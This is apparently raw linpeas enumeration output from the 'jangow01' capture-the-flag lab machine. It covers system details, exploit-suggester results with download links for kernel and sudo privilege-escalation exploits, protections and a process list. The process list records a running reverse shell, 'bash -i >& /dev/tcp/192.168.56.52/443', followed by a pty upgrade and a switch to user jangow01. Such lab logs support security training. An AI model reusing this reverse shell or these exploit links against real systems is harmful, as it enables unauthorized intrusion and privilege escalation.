#jangow01 #linpeas #shell #PEASS #SirBroccoli




```sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                   
    |---------------------------------------------------------------------------------|                                   
    |         Follow on Twitter         :     @hacktricks_live                        |                                   
    |         Respect on HTB            :     SirBroccoli                             |                                   
    |---------------------------------------------------------------------------------|                                   
    |                                 Thank you!                                      |                                   
    \---------------------------------------------------------------------------------/                                   
          linpeas-ng by github.com/PEASS-ng                                                                               
                                                                                                                          
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                    
                                                                                                                          
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                  
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                       
                               ╚═══════════════════╝                                                                      
OS: Linux version 4.4.0-31-generic (buildd@lgw01-16) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2.1) ) #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016
User & Groups: uid=1000(jangow01) gid=1000(desafio02) grupos=1000(desafio02)
Hostname: jangow01
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                                 
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                                      
                                                                                                                          
                                                                                                                          

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: erro de gravação: Pipe quebrado                                                                                                                      
DONE                                                                                                                      
                                                                                                                          
                              ╔════════════════════╗                                                                      
══════════════════════════════╣ System Information ╠══════════════════════════════                                        
                              ╚════════════════════╝                                                                                       
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                         
Linux version 4.4.0-31-generic (buildd@lgw01-16) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2.1) ) #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.1 LTS
Release:        16.04
Codename:       xenial

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                            
Sudo versão 1.8.16                                                                                                                         


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                    
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games                                                   

╔══════════╣ Date & uptime
S�b Jul  6 09:05:24 BRT 2024                                                                                                               
 09:05:24 up 18:13,  0 users,  load average: 0,60, 0,13, 0,04

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                       
sda
sda1
sda2
sda5

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                  
UUID=e144a6fe-a609-4f83-85c1-a9915869294b /               ext4    errors=remount-ro 0       1                                              
UUID=f79b5da8-9400-4f54-b78a-b91dd79cea63 none            swap    sw              0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                    
LESSOPEN=| /usr/bin/lesspipe %s                                                                                                            
HISTFILESIZE=0
MAIL=/var/mail/jangow01
USER=jangow01
LANGUAGE=pt_BR:pt:en
LC_TIME=pt_BR
SHLVL=4
HOME=/home/jangow01
OLDPWD=/var/www/html/site
LC_MONETARY=pt_BR
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
LOGNAME=jangow01
_=./linpeas.sh
XDG_SESSION_ID=c1
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
LC_ADDRESS=pt_BR
XDG_RUNTIME_DIR=/run/user/1000
APACHE_LOCK_DIR=/var/lock/apache2
LC_TELEPHONE=pt_BR
LANG=pt_BR.UTF-8
HISTSIZE=0
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SHELL=/bin/bash
LC_NAME=pt_BR
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
LESSCLOSE=/usr/bin/lesspipe %s %s
APACHE_LOG_DIR=/var/log/apache2
LC_MEASUREMENT=pt_BR
LC_IDENTIFICATION=pt_BR
PWD=/home/jangow01
LC_NUMERIC=pt_BR
LC_PAPER=pt_BR
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                     
dmesg Not Found                                                                                                                            
                                                                                                                                           
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                         
cat: erro de gravação: Pipe quebrado                                                                                                       
cat: erro de gravação: Pipe quebrado
cat: erro de gravação: Pipe quebrado                                                                                                                      
cat: erro de gravação: Pipe quebrado                                                                                                                      
cat: erro de gravação: Pipe quebrado
cat: erro de gravação: Pipe quebrado
cat: erro de gravação: Pipe quebrado
cat: erro de gravação: Pipe quebrado
cat: erro de gravação: Pipe quebrado                                                                                                                                         
cat: erro de gravação: Pipe quebrado                                                                                                                                         
cat: erro de gravação: Pipe quebrado                                                                                                                                         
cat: erro de gravação: Pipe quebrado                                                                                                                                         
[+] [CVE-2017-16995] eBPF_verifier                                                                                                                                           
                                                                                                                                                                             
   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html                                                                                
   Exposure: highly probable                                                                                                                                                 
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: highly probable
   Tags: [ ubuntu=(14.04|16.04){kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic} ]
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
   Exposure: probable
   Tags: ubuntu=14.04{kernel:4.4.0-*},[ ubuntu=16.04 ]{kernel:4.8.0-*}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2016-4997] target_offset

   Details: https://www.exploit-db.com/exploits/40049/
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/40053.zip
   Comments: ip_tables.ko needs to be loaded

[+] [CVE-2016-4557] double-fdput()

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                      
  [1] af_packet                                                                                                                                                              
      CVE-2016-8655
      Source: http://www.exploit-db.com/exploits/40871
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] get_rekt
      CVE-2017-16695
      Source: http://www.exploit-db.com/exploits/45010


╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                                
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                                                                     
═╣ PaX bins present? .............. PaX Not Found                                                                                                                            
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                     
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                       
═╣ Seccomp enabled? ............... disabled                                                                                                                                 
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... disabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (oracle)                                                                                                                             

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                          
                                   ╚═══════════╝                                                                                                                             
╔══════════╣ Container related tools present (if any):
/usr/bin/lxc                                                                                                                                                                 
╔══════════╣ Am I Containered?
╔══════════╣ Container details                                                                                                                                               
═╣ Is this a container? ........... No                                                                                                                                       
═╣ Any running containers? ........ No                                                                                                                                       
                                                                                                                                                                             
                                                                                                                                                                             
                                     ╔═══════╗                                                                                                                               
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                                          
                                     ╚═══════╝                                                                                                                               
═╣ GCP Virtual Machine? ................. No                                                                                                                                 
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ Aliyun ECS? .......................... No
grep: /etc/cloud/cloud.cfg: Arquivo ou diretório não encontrado
═╣ Tencent CVM? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No

curl: (6) Could not resolve host: metadata.google.internal


                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                           
                ╚════════════════════════════════════════════════╝                                                                                                           
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                  
root         1  0.0  0.5  37808  5880 ?        Ss   Jul05   0:05 /sbin/init                                                                                                  
root      1021  0.0  0.9  36948  9520 ?        Ss   Jul05   0:37 /lib/systemd/systemd-journald
root      1050  0.0  0.1  94772  1516 ?        Ss   Jul05   0:00 /sbin/lvmetad -f
root      1068  0.0  0.4  45508  4884 ?        Ss   Jul05   0:32 /lib/systemd/systemd-udevd
systemd+  1211  0.0  0.2 100324  2304 ?        Ssl  Jul05   0:03 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root      1847  0.0  0.2  29304  2852 ?        Ss   Jul05   0:00 /usr/sbin/cron -f
daemon[0m    1848  0.0  0.1  26044  2016 ?        Ss   Jul05   0:00 /usr/sbin/atd -f
message+  1849  0.0  0.3  42896  3692 ?        Ss   Jul05   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
  └─(Caps) 0x0000000020000000=cap_audit_write
root      1860  0.0  1.0 267712 10524 ?        Ssl  Jul05   0:00 /usr/lib/snapd/snapd
root      1867  0.0  0.4 629704  4404 ?        Ssl  Jul05   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
syslog    1871  0.0  0.3 260628  4052 ?        Ssl  Jul05   0:11 /usr/sbin/rsyslogd -n
root      1873  0.0  0.6 276232  6188 ?        Ssl  Jul05   0:20 /usr/lib/accountsservice/accounts-daemon[0m
root      1875  0.0  0.1   4396  1252 ?        Ss   Jul05   0:00 /usr/sbin/acpid
root      1876  0.0  0.3  28544  3140 ?        Ss   Jul05   0:00 /lib/systemd/systemd-logind
root      1916  0.0  0.0  13372   160 ?        Ss   Jul05   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root      1931  0.0  0.5 277176  5920 ?        Ssl  Jul05   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      2183  0.0  0.2  16120  2820 ?        Ss   Jul05   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.enp0s17.pid -lf /var/lib/dhcp/dhclient.enp0s17.leases -I -df /var/lib/dhcp/dhclient6.enp0s17.leases enp0s17
root      2611  0.0  0.3  24136  3756 ?        Ss   Jul05   0:16 /usr/sbin/vsftpd /etc/vsftpd.conf
root      2626  0.0  0.0   5220   148 ?        Ss   Jul05   0:04 /sbin/iscsid
root      2627  0.0  0.3   5720  3508 ?        S<Ls Jul05   0:39 /sbin/iscsid
root      2711  0.0  0.6  65600  6192 ?        Ss   Jul05   0:00 /usr/sbin/sshd -D
mysql     2715  0.0 14.9 1114572 151632 ?      Ssl  Jul05   0:37 /usr/sbin/mysqld
root      2729  0.0  3.3 413960 34468 ?        Ss   Jul05   0:08 /usr/sbin/apache2 -k start
www-data  2916  0.0  1.4 414524 15080 ?        S    Jul05   0:07  _ /usr/sbin/apache2 -k start
www-data  2917  0.0  1.4 414428 14944 ?        S    Jul05   0:07  _ /usr/sbin/apache2 -k start
www-data  3585  0.0  1.4 414452 15200 ?        S    Jul05   0:07  _ /usr/sbin/apache2 -k start
www-data  3603  0.0  1.3 414256 13964 ?        S    Jul05   0:04  _ /usr/sbin/apache2 -k start
www-data  3607  0.0  1.3 414236 13336 ?        S    Jul05   0:04  _ /usr/sbin/apache2 -k start
www-data 28204  0.0  0.0   4504   780 ?        S    08:27   0:00  |   _ sh -c /bin/bash -c 'bash -i >& /dev/tcp/192.168.56.52/443 0>&1'
www-data 28205  0.0  0.2  18024  2824 ?        S    08:27   0:00  |       _ /bin/bash -c bash -i >& /dev/tcp/192.168.56.52/443 0>&1
www-data 28206  0.0  0.3  18212  3216 ?        S    08:27   0:00  |           _ bash -i
www-data 28218  0.0  0.8  35824  8688 ?        S    08:29   0:00  |               _ python3 -c import pty;pty.spawn("/bin/bash")
www-data 28219  0.0  0.3  18236  3324 pts/0    Ss   08:29   0:00  |                   _ /bin/bash
root     28223  0.0  0.2  49344  3004 pts/0    S    08:32   0:00  |                       _ su jangow01
jangow01 28233  0.0  0.5  22880  5368 pts/0    S    08:32   0:00  |                           _ bash
jangow01 28349  0.3  0.2   5444  2684 pts/0    S+   09:05   0:00  |                               _ /bin/sh ./linpeas.sh
jangow01   621  0.0  0.1   5444  1036 pts/0    S+   09:05   0:00  |                                   _ /bin/sh ./linpeas.sh
jangow01   625  0.0  0.3  37840  3644 pts/0    R+   09:05   0:00  |                                   |   _ ps fauxwww
jangow01   624  0.0  0.1   5444  1036 pts/0    S+   09:05   0:00  |                                   _ /bin/sh ./linpeas.sh
www-data  4512  0.0  1.4 414228 14576 ?        S    00:23   0:00  _ /usr/sbin/apache2 -k start
www-data  4516  0.0  1.4 414372 14908 ?        S    00:23   0:00  _ /usr/sbin/apache2 -k start
www-data  4517  0.0  1.4 414236 14548 ?        S    00:23   0:00  _ /usr/sbin/apache2 -k start
www-data  4519  0.0  1.4 414308 14992 ?        S    00:23   0:00  _ /usr/sbin/apache2 -k start
www-data  4522  0.0  1.4 414308 14996 ?        S    00:24   0:00  _ /usr/sbin/apache2 -k start
root      4436  0.0  0.1  16232  1744 tty1     Ss+  00:02   0:00 /sbin/agetty --noclear tty1 linux
jangow01 28224  0.0  0.4  45248  4560 ?        Ss   08:32   0:00 /lib/systemd/systemd --user
jangow01 28227  0.0  0.1  61260  1904 ?        S    08:32   0:00  _ (sd-pam)

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                 
                                                                                                                                                                             
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                                                                    
Proc 1211 with ppid 1 is run by user systemd-timesync but the ppid user is root                                                                                              
Proc 1848 with ppid 1 is run by user daemon but the ppid user is root
Proc 1849 with ppid 1 is run by user messagebus but the ppid user is root
Proc 1871 with ppid 1 is run by user syslog but the ppid user is root
Proc 2715 with ppid 1 is run by user mysql but the ppid user is root
Proc 2916 with ppid 2729 is run by user www-data but the ppid user is root
Proc 2917 with ppid 2729 is run by user www-data but the ppid user is root
Proc 3585 with ppid 2729 is run by user www-data but the ppid user is root
Proc 3603 with ppid 2729 is run by user www-data but the ppid user is root
Proc 3607 with ppid 2729 is run by user www-data but the ppid user is root
Proc 4512 with ppid 2729 is run by user www-data but the ppid user is root
Proc 4516 with ppid 2729 is run by user www-data but the ppid user is root
Proc 4517 with ppid 2729 is run by user www-data but the ppid user is root
Proc 4519 with ppid 2729 is run by user www-data but the ppid user is root
Proc 4522 with ppid 2729 is run by user www-data but the ppid user is root
Proc 28224 with ppid 1 is run by user jangow01 but the ppid user is root
